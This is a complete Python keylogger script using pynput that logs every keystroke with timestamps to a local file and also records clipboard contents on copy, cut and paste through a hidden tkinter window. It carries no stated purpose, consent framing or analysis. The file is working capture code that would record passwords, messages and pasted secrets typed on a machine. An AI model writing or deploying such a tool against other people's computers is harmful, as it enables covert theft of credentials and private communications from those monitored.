from pynput import keyboard
import datetime
import time
import tkinter as tk
import queue

# File to save logs
log_file = "keylog.txt"

# Buffer for accumulating words
current_word = ""

# Set to track pressed keys for combos
pressed_keys = set()

# Tkinter root for clipboard access
root = tk.Tk()
root.withdraw()  # Hide the window

# Function to safely get clipboard content from main thread
def get_clipboard():
    q = queue.Queue()
    def callback():
        try:
            q.put(root.clipboard_get())
        except tk.TclError:
            q.put("[empty or error]")
    root.after(0, callback)
    return q.get()

# Function to write to file with timestamp (appends)
def write_to_log(content):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"{timestamp} - {content}\n")

# Function to process and log key
def log_key(key):
    global current_word
    try:
        # Check for clipboard combos (Ctrl/Cmd + C/V/X)
        modifier_pressed = (keyboard.Key.ctrl in pressed_keys or
                            keyboard.Key.ctrl_l in pressed_keys or
                            keyboard.Key.ctrl_r in pressed_keys or
                            keyboard.Key.cmd in pressed_keys or
                            keyboard.Key.cmd_l in pressed_keys or
                            keyboard.Key.cmd_r in pressed_keys)
        
        if hasattr(key, 'char') and key.char is not None:
            char = key.char.lower()  # For combo detection
            if modifier_pressed and char in ['c', 'v', 'x']:
                # Flush current word if any
                if current_word:
                    write_to_log(current_word)
                    current_word = ""
                
                # Handle the combo
                if char == 'v':
                    # Paste: Get clipboard content
                    pasted = get_clipboard()
                    write_to_log(f"[paste: {pasted}]")
                else:
                    # Copy/Cut: Small delay to let OS update clipboard, then get
                    time.sleep(0.1)  # Increased slightly for reliability
                    clipped = get_clipboard()
                    action = "copy" if char == 'c' else "cut"
                    write_to_log(f"[{action}: {clipped}]")
                
                return  # Don't log the individual key
            
            # Regular printable char: append to buffer
            current_word += key.char
        else:
            # Special key: log buffer first if not empty
            if current_word:
                write_to_log(current_word)
                current_word = ""  # Clear buffer
            
            # Handle special keys
            if key == keyboard.Key.space:
                logged = "[space]"
            elif key == keyboard.Key.enter:
                logged = "[enter]"
            elif key == keyboard.Key.backspace:
                # Basic backspace: remove last char if buffer not empty
                if current_word:
                    current_word = current_word[:-1]
                return  # Don't log backspace itself
            elif key.name:
                logged = f"[{key.name}]"
            else:
                logged = "[unknown]"
            
            write_to_log(logged)
    except Exception as e:
        print(f"Error logging key: {e}")  # For debugging

# Function called on key press
def on_press(key):
    pressed_keys.add(key)
    log_key(key)

# Function called on key release
def on_release(key):
    pressed_keys.discard(key)
    if key == keyboard.Key.esc:
        global current_word
        # Log any remaining buffer before stopping
        if current_word:
            write_to_log(current_word)
            current_word = ""
        # Schedule quit on main thread
        root.after(0, root.quit)
        return False  # Stop listener

# Create and start the listener
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

# Run tkinter main loop in main thread
root.mainloop()

# Cleanup after mainloop exits
listener.stop()
listener.join()
root.destroy()
